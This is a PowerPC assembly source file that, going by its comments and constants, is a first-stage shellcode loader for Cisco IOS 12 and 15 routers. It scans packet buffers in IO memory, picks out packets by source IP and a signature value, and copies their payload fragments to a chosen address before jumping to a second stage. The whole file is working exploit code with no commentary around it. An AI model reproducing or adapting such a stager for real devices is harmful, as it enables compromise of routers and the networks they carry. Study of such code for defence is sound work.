#**************************************************************************/
#                                                                         */
#    external declarations                                                */
#                                                                         */
#**************************************************************************/
    .globl _start
    

#**************************************************************************/
#                                                                         */
#    section declaration                                                  */
#                                                                         */ 
#**************************************************************************/

  
    .section ".text"

.equ SIGNATURE, _SIGNATURE
.equ COPY,      _COPY

.equ OFFSET_IOS_15,  0xB0
.equ OFFSET_IOS_12,  0x80

.ifdef IOS_15
	.equ OFFSET, OFFSET_IOS_15
.endif

.ifdef IOS_12
	.equ OFFSET, OFFSET_IOS_12
.endif

.equ IPHDR_SIZE, 40


_start:

#		mr	  r19, r3  # start of the IO-memory region
#		mr	  r21, r4  # size of shellcode
#		mr	  r22, r5  # source ip
#		mr	  r25, r6  # destination address (address to which the shellcode will be copied)

#		li	  r20, 0   # cur_size
#		li	  r24, 0   # cur_ip_id

		b	  check_cur_size
# ---------------------------------------------------------------------------

next_pass:
		mr	  r31, r19
		b	  next_block_2
# ---------------------------------------------------------------------------

proc_block:
		addi	  r11, r31, OFFSET
		lwz	  r0, 0xC(r11)
		cmpw	  cr7, r0, r22
		bne+	  cr7, next_block
		cmpwi	  cr7, r24, 0
		lhz	  r5, 2(r11)
		bne	  cr7, first_block_found
		lis	  r9, SIGNATURE@h
		mr	  r10, r11
		ori	  r9, r9, SIGNATURE@l
		add	  r8, r11, r5
		b	  loc_74
# ---------------------------------------------------------------------------

loc_64:
		lwz	  r0, 0(r10)
		cmpw	  cr7, r0, r9
		beq	  cr7, calc_cur_block_size
		mr	  r10, r3

loc_74:
		cmplw	  cr7, r10, r8
		addi	  r3, r10, 4
		blt	  cr7, loc_64
		b	  next_block
# ---------------------------------------------------------------------------

calc_cur_block_size:
		add	  r9, r11, r5
		lhz	  r24, 4(r11)
		subf	  r9, r10, r9
		addi	  r9, r9, -4
		b	  copy_block
# ---------------------------------------------------------------------------

first_block_found:
		lhz	  r0, 4(r11)
		cmpw	  cr7, r24, r0
		bne+	  cr7, next_block
		addi	  r9, r5, -0x28
		addi	  r3, r31, (IPHDR_SIZE + OFFSET)

copy_block:
		lis	  r0, COPY@h
		mr    r4, r25
		ori	  r0, r0, COPY@l
		srwi	  r5, r9, 2
		mtctr r0
		add	  r20, r20, r9
		addi  r24, r24, 1
		add	  r25, r25, r9
		bctrl

next_block:
		lwz	  r31, 0x14(r31)

next_block_2:
		lwz	  r0, 0x14(r31)
		cmpwi	  cr7, r0, 0
		bne-	  cr7, proc_block

check_cur_size:
		cmpw	  cr7, r20, r21
		bne	  cr7, next_pass
stage2:

# End of __start
